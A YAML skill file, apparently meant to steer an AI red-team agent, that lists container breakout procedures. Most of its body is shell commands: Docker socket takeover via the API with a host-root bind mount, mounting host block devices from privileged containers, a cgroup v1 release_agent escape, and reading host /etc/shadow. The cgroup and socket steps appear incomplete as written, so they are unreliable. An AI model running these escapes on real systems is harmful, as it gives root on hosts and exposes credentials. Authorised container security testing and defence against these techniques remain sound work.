schema_version: 1
version: 3.0.0
name: container-security
description: >
  Container runtime security assessment and host breakouts — Docker socket mounting (/var/run/docker.sock),
  privileged container capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE), cgroups v1 release_agent escape,
  and host filesystem volume mounts.
triggers:
  - container
  - docker
  - docker escape
  - docker socket
  - cgroup
  - privileged container
  - container breakout
  - containerd
tools:
  - curl
  - find
knowledge: |
  Assess container runtime configurations and isolation boundaries for host breakout opportunities
  with senior red-team precision.

  1. CONTAINER RUNTIME DETECTION & ENUMERATION:
     - Verify container execution environment:
       test -f /.dockerenv || grep -qE 'docker|containerd' /proc/1/cgroup
     - Enumerate process capabilities:
       grep CapEff /proc/self/status (decode using capsh --decode=<hex>)
     - Identify mounted filesystems and volumes:
       df -h; mount | grep -E "(/dev/sd|/dev/vd|/dev/nvme|docker)"

  2. DOCKER DAEMON SOCKET EXPLOITATION (/var/run/docker.sock):
     Mounting the host Docker socket inside a container yields immediate root on the underlying host:
     - Verify socket accessibility:
       curl -s --unix-socket /var/run/docker.sock http://localhost/version
     - List host containers and images:
       curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
     - Breakout via privileged container creation:
       curl -s --unix-socket /var/run/docker.sock -H "Content-Type: application/json" \
         -d '{"Image":"alpine","Cmd":["chroot","/host","id"],"Binds":["/:/host"]}' \
         http://localhost/containers/create

  3. PRIVILEGED CONTAINER BREAKOUT (CAP_SYS_ADMIN):
     If the container runs with `--privileged` or `CAP_SYS_ADMIN`:
     a. Direct Block Device Mount:
        List host storage partitions: `fdisk -l` or `ls -la /dev/sd* /dev/vd* /dev/nvme*`
        Mount host root partition to local directory:
          mkdir /tmp/host_root && mount /dev/sda1 /tmp/host_root
        Access host filesystem directly at `/tmp/host_root`.
     b. Cgroup v1 release_agent Escape:
        If using cgroups v1 with notify_on_release:
          mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
          echo 1 > /tmp/cgrp/notify_on_release
          echo "/bin/sh -c 'echo ESCAPED > /tmp/host_marker'" > /tmp/cmd
          chmod +x /tmp/cmd
          echo "/tmp/cmd" > /tmp/cgrp/release_agent

  4. SENSITIVE HOST FILESYSTEM MOUNTS:
     Search for host directories mounted into container:
       grep -E "(/etc|/var|/home|/root|/proc)" /proc/mounts | grep -v "/proc/sys"
     - Exposed `/etc`: inspect `/etc/shadow` or cron jobs on host.
     - Exposed host `/proc`: access host processes, environment variables, and `/proc/sysrq-trigger`.

  5. EVIDENCE & CLEANUP:
     - Demonstrate host-level access non-destructively: read `/etc/hostname` of host vs container hostname.
     - Unmount any temporarily mounted block devices immediately after verification.
references:
  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout
  - https://attack.mitre.org/techniques/T1611/
